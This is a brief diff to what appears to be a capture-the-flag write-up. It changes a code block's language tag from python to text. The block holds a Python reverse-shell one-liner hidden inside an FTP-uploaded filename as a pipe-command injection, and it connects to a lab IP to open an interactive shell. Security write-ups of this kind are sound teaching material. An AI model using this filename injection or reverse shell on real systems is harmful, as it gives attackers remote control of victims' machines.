@@ -499,7 +499,7 @@ I tried a classic Pentestmonkey [Python reverse shell](https://pentestmonkey.net
 
 To exploit this we need our file to be called this once it's uploaded via ftp:
 
-```python
+```text
 "|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.239\",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""\"sh\",""\"-i\"])';.csv"
 ```
 
